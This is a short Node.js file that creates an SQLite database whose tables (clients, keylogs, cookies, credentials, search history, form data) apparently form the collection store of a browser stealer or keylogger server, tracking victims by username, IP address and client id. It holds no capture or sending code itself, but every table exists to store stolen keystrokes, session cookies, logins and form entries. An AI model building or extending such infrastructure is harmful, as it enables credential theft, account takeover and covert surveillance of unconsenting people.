// Import the better-sqlite3 library
const Database = require("better-sqlite3");

// Create or open a new SQLite3 database
const db = new Database("database.db", { verbose: console.log });

// Function to create all tables
function setupTables() {
  // Create clients table
  db.prepare(
    `
        CREATE TABLE IF NOT EXISTS clients (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT UNIQUE NOT NULL,
            os TEXT NOT NULL,
            username TEXT NOT NULL,
            ip_address TEXT NOT NULL,
            last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `
  ).run();

  // Create keylogs table
  db.prepare(
    `
        CREATE TABLE IF NOT EXISTS keylogs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            keystrokes TEXT NOT NULL,
            url TEXT NOT NULL,
            FOREIGN KEY (client_id) REFERENCES clients(client_id)
        )
    `
  ).run();

  // Create cookies table
  db.prepare(
    `
        CREATE TABLE IF NOT EXISTS cookies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT NOT NULL,
            domain TEXT NOT NULL,
            name TEXT NOT NULL,
            value TEXT NOT NULL,
            expiration DATETIME,
            secure BOOLEAN NOT NULL,
            session BOOLEAN NOT NULL,
            path TEXT NOT NULL,
            host_only BOOLEAN,
            http_only BOOLEAN,
            FOREIGN KEY (client_id) REFERENCES clients(client_id)
        )
    `
  ).run();

  // Create credentials table
  db.prepare(
    `
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT NOT NULL,
            url TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            data TEXT NOT NULL,
            FOREIGN KEY (client_id) REFERENCES clients(client_id)
        )
    `
  ).run();

  // Create search_history table
  db.prepare(
    `
        CREATE TABLE IF NOT EXISTS search_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT NOT NULL,
            search_engine TEXT NOT NULL,
            search_query TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (client_id) REFERENCES clients(client_id)
        )
    `
  ).run();

  // Create form_data table
  db.prepare(
    `
        CREATE TABLE IF NOT EXISTS form_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT NOT NULL,
            capture_id TEXT NOT NULL,
            domain TEXT NOT NULL,
            field_name TEXT NOT NULL,
            field_value TEXT NOT NULL,
            FOREIGN KEY (client_id) REFERENCES clients(client_id)
        )
    `
  ).run();

  console.log("All tables created successfully");
}

// Call the function to set up the tables
setupTables();
